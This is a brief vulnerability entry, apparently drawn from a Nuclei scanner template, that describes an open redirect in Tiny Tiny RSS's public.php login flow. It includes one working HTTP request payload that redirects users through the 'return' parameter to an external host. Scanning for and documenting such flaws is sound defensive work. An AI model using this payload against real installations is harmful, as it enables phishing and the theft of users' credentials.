# Vulnerability: TinyTiny RSS Open Redirect
**Classification:** REDIRECT
**Source:** Nuclei Template (`tinytiny-rss-redirect.yaml`)

## Description
Detected an open redirect vulnerability in Tiny Tiny RSS where the return parameter in public.php was abused to redirect users to an attacker-controlled external URL after the authentication flow.

## Vulnerable Code Pattern / Exploit Payload
```http
GET {{BaseURL}}/public.php?return=http%3a%2f%2finteract.sh%2f&op=login&login=password=&profile=0
```

